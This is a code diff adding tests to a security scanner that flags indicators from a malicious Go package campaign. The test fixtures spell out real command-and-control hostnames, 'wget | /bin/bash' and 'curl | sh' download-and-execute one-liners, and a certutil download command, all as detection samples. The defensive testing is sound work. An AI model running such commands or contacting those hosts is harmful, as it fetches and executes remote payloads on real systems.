@@ -1355,6 +1355,79 @@ test("verify-no-registry-exfiltration ignores benign react-login-shaped tokens",
   assert.equal(findings.length, 0, JSON.stringify(findings, null, 2));
 });
 
+test("verify-no-registry-exfiltration flags the 11-Go-package obfuscated-loader IOCs", async () => {
+  // Positive: the documented IOCs from the Socket 2025-08-06 write-up
+  // on the 11 malicious Go packages that all rebuild a `wget | bash` /
+  // `certutil -urlcache` one-liner from an index-based string array
+  // and hand it to `exec.Command("/bin/sh", "-c", ...)`:
+  // https://socket.dev/blog/11-malicious-go-packages-distribute-obfuscated-remote-payloads
+  //   - C2 host (one of 7 documented `.icu` / `.tech` / `.fun`)
+  //   - shared C2 URL-path signature `/storage/de373d0df/a31546bf`
+  //     (Bash second-stage) or `/storage/bbb28ef04/fa31546b` (Win PE)
+  //   - `wget -O - URL | /bin/bash` / `curl ... | sh` shell-pipe-eval
+  //   - `certutil.exe -urlcache -split -f` Windows LOLBin download
+  const { findForbiddenRegistryExfilCalls } = await import(
+    "../scripts/verify-no-registry-exfiltration.js"
+  );
+  const sample = [
+    "// unsafe: documented C2 host for the 11-Go-package campaign",
+    'const a = "https://monsoletter.icu/some/path";',
+    "",
+    "// unsafe: subdomain of another documented C2 host",
+    'const b = "https://cdn.kaiaflow.icu/index";',
+    "",
+    "// unsafe: shared C2 URL-path signature (Bash second-stage)",
+    'const c = "/storage/de373d0df/a31546bf";',
+    "",
+    "// unsafe: shared C2 URL-path signature (Windows PE second-stage)",
+    'const d = "/storage/bbb28ef04/fa31546b";',
+    "",
+    "// unsafe: shell-pipe-to-shell download-and-execute one-liner",
+    'const e = "wget -O - https://example.test/x | /bin/bash";',
+    "",
+    "// unsafe: curl variant of the same TTP",
+    'const f = "curl -s https://example.test/x | sh";',
+    "",
+    "// unsafe: Windows LOLBin download primitive",
+    'const g = "certutil.exe -urlcache -split -f https://example.test/x out.exe";',
+  ].join("\n");
+  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
+  assert.equal(findings.length, 7, JSON.stringify(findings, null, 2));
+  for (const finding of findings) {
+    assert.match(finding.reason, /11 malicious Go packages/);
+  }
+});
+
+test("verify-no-registry-exfiltration ignores benign 11-Go-package-shaped tokens", async () => {
+  // Negative: unrelated `.icu` / `.tech` / `.fun` hosts not on the
+  // documented list, an unrelated `/storage/...` path, identifiers
+  // that share a prefix with the downloader binaries (`curlPipe`,
+  // `wgetable`), and a doc-comment mention of `certutil` must NOT
+  // trip the gate.
+  const { findForbiddenRegistryExfilCalls } = await import(
+    "../scripts/verify-no-registry-exfiltration.js"
+  );
+  const sample = [
+    "// safe: unrelated `.icu` TLD, not one of the 7 documented IOC hosts",
+    'const a = "https://example.icu/index";',
+    "",
+    "// safe: unrelated `/storage/...` path that does not match either IOC signature",
+    'const b = "/storage/uploads/profile.png";',
+    "",
+    "// safe: identifier that shares a prefix with `curl` / `wget`",
+    "const curlPipe = configureClient();",
+    "const wgetable = false;",
+    "",
+    "// safe: a curl/wget command WITHOUT a pipe to a shell",
+    'const fetchCmd = "curl -sSL https://example.test/data > out.json";',
+    "",
+    "// safe: doc-comment mention of the LOLBin name (no `-urlcache` flag)",
+    "// the campaign uses certutil to silently download a PE",
+  ].join("\n");
+  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
+  assert.equal(findings.length, 0, JSON.stringify(findings, null, 2));
+});
+
 test("verify-no-registry-exfiltration accepts the live src/ tree", async () => {
   const { findForbiddenRegistryExfilCalls } = await import(
     "../scripts/verify-no-registry-exfiltration.js"
